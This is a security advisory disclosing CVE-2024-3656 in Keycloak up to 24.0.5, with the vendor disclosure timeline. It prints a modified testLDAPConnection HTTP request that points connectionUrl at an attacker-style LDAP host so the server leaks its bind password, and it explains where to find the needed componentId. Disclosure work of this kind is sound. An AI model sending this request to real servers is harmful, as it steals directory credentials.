# HN Security Advisory - https://security.humanativaspa.it/

* Title: Multiple authentication and authorization vulnerabilities in Keycloak
* Products: Keycloak <= 24.0.5
* Author: Ema Srdoc <ema.srdoc at hnsecurity.it> and Maurizio Agazzini <maurizio.agazzini at hnsecurity.it>
* Date: 2024-10-30
* CVE Names and Vendor CVSS Scores:
  CVE-2024-3656: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N  
* Advisory URLs:
  https://github.com/hnsecurity/vulns/blob/main/HNS-2024-08-Keycloak.md

# Description

Multiple issues have been identified regarding the authentication and authorization of certain endpoints in the Keycloak software.

## Unauthenticated access to certain functionalities

It has been observed that certain functionalities within Keycloak, specifically the */metrics* and */health* endpoints, are accessible without proper authentication. Even though these endpoints do not provide sensitive information, it is preferable that they are accessible only to authenticated individuals with the correct privileges.

## Unauthorized use of administrative features by low-privilege users

Additionally, users with low privileges are able to utilize administrative functionalities within the Keycloak admin interface. This issue presents a significant security risk as it allows unauthorized users to perform actions reserved for administrators, potentially leading to data breaches or system compromise. Affected endpoints are:

- /admin/realms/myrealm/client-registration-policy/providers
- /admin/myrealm/console/whoami
- /admin/realms/myrealm/testLDAPConnection

In particular, the last functionality (*testLDAPConnection*), in the event that an AD authentication system has been configured, allows to modify application data, **enabling the submission of an LDAP request and consequently the access credentials to a malicious endpoint**.

An attacker with access to a non-administrative user can modify the *connectionUrl* parameter, and the password will be sent to an attacker-controller server. To successfully execute the attack, it's also necessary to know the *componentId* related to the domain authentication, which is retrievable in the cookies K*EYCLOAK_SESSION*, *KEYCLOAK_SESSION_LEGACY*, and in the responses returned by the */admin/myrealm/console/whoami* endpoints.

Example of modified request:

``` http
POST /admin/realms/myrealm/testLDAPConnection HTTP/2
Host: idp.url
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: application/json, text/plain, */*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://idp.url/admin/myrealm/console/
Authorization: Bearer [...]
Content-Type: application/json
Content-Length: 308
Origin: https://idp.url
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

{"connectionUrl":"ldap://evil.hnsecurity.it","bindDn":"cn=test","bindCredential":"**********","useTruststoreSpi":"","connectionTimeout":"5000","startTls":"false","authType":"simple","action":"testAuthentication","componentId":"12345-1234-1234-1234-123456789"}
```

# Affected platforms

All Keycloak versions up to and including version 24.0.5 are affected.
 
# Disclosure timeline

04/04/2024 - First communication sent with all details.
09/04/2024 - Response with request of clarifications.
09/04/2024 - More details sent.
09/04/2024 - Second reply.
09/04/2024 - [Proposed fix](https://github.com/keycloak/keycloak/pull/27629) for the first issue.
10/04/2024 - Multiple emails about the first issue.
02/05/2024 - Request for information about the second issue (which is more severe).
09/05/2024 - Response with assigned CVE-2024-3656 and request to not release any details: `For the moment there is no estimated keycloak version to include the fix`
27/05/2024 - Request for an update and  a timeline for the fix
11/06/2024 - [Advisory](https://github.com/keycloak/keycloak/security/advisories/GHSA-2cww-fgmg-4jqc) published without any notification.
